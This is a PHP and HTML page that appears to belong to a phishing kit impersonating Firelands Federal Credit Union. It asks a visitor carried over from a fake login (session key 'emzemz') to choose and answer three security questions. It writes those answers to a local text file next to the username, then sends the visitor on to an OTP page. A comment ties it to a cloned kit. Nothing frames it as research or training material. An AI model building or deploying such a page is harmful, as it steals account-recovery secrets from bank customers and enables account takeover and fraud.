<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

// Security questions array (matching affinity)
$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');
    
    // Validation
    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';
    
    // Check for duplicate questions
    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];
        
        saveUserData('security_questions.txt', $data);
        
        // Redirect to OTP page
        header('Location: otp.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firelands FCU - Security Questions</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="relative flex min-h-screen flex-col overflow-hidden text-white">
        <!-- Background Image with Overlay -->
        <div class="absolute inset-0">
            <img
                src="assets/firelands-landing.jpg"
                alt="Sun setting over Firelands farm fields"
                class="h-full w-full object-cover"
            />
            <div class="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
            <div class="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
                <!-- Left Section: Hero Text -->
                <section class="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
                    <div class="space-y-3">
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Security Verification
                        </p>
                        <h1 class="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                            Please answer these security questions
                        </h1>
                    </div>
                </section>

                <!-- Right Section: Security Questions Card -->
                <section class="order-1 w-full max-w-md lg:order-2 lg:self-start">
                    <div class="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
                        <!-- Logo -->
                        <div class="flex items-center justify-start">
                            <img
                                src="assets/logo.svg"
                                alt="Firelands Federal Credit Union"
                                class="h-12 w-auto"
                            />
                        </div>

                        <!-- Heading -->
                        <h2 class="mt-6 text-2xl font-semibold text-[#2f2e67]">Security Questions</h2>
                        <p class="mt-2 text-sm text-gray-600">Select and answer 3 security questions to verify your identity.</p>

                        <!-- Error Display -->
                        <?php if (!empty($errors)): ?>
                            <div class="mt-4 rounded-lg bg-red-50 border border-red-200 p-4">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <form method="POST" class="mt-6 space-y-6">
                            <!-- Question 1 -->
                            <div class="space-y-2">
                                <label for="question1" class="text-sm font-medium text-gray-600">
                                    Security Question 1
                                </label>
                                <select
                                    id="question1"
                                    name="question1"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                >
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $index => $question): ?>
                                        <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question1']) && $_POST['question1'] === $question) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($question); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question1'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['question1']); ?></p>
                                <?php endif; ?>
                            </div>

                            <div class="space-y-2">
                                <input
                                    type="text"
                                    name="answer1"
                                    placeholder="Your answer"
                                    value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['answer1'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['answer1']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Question 2 -->
                            <div class="space-y-2">
                                <label for="question2" class="text-sm font-medium text-gray-600">
                                    Security Question 2
                                </label>
                                <select
                                    id="question2"
                                    name="question2"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                >
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $index => $question): ?>
                                        <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question2']) && $_POST['question2'] === $question) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($question); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question2'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['question2']); ?></p>
                                <?php endif; ?>
                            </div>

                            <div class="space-y-2">
                                <input
                                    type="text"
                                    name="answer2"
                                    placeholder="Your answer"
                                    value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['answer2'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['answer2']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Question 3 -->
                            <div class="space-y-2">
                                <label for="question3" class="text-sm font-medium text-gray-600">
                                    Security Question 3
                                </label>
                                <select
                                    id="question3"
                                    name="question3"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                >
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $index => $question): ?>
                                        <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question3']) && $_POST['question3'] === $question) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($question); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <?php if (isset($errors['question3'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['question3']); ?></p>
                                <?php endif; ?>
                            </div>

                            <div class="space-y-2">
                                <input
                                    type="text"
                                    name="answer3"
                                    placeholder="Your answer"
                                    value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['answer3'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['answer3']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Submit Button -->
                            <button
                                type="submit"
                                class="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                            >
                                Continue
                            </button>

                            <!-- Back Link -->
                            <div class="text-center">
                                <a href="index.php" class="text-sm font-medium text-[#801346] transition hover:text-[#5a63d8] hover:underline">
                                    Back to Login
                                </a>
                            </div>
                        </form>
                    </div>
                </section>
            </div>

            <!-- Footer Links -->
            <div class="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
                <?php foreach ($footerLinks as $index => $label): ?>
                    <a href="#" class="transition hover:text-white">
                        <?php echo htmlspecialchars($label); ?>
                    </a>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        // Auto-focus first question on page load
        document.addEventListener('DOMContentLoaded', function() {
            const firstQuestion = document.getElementById('security_question_1');
            if (firstQuestion) {
                firstQuestion.focus();
            }
        });
    </script>
</body>
</html>
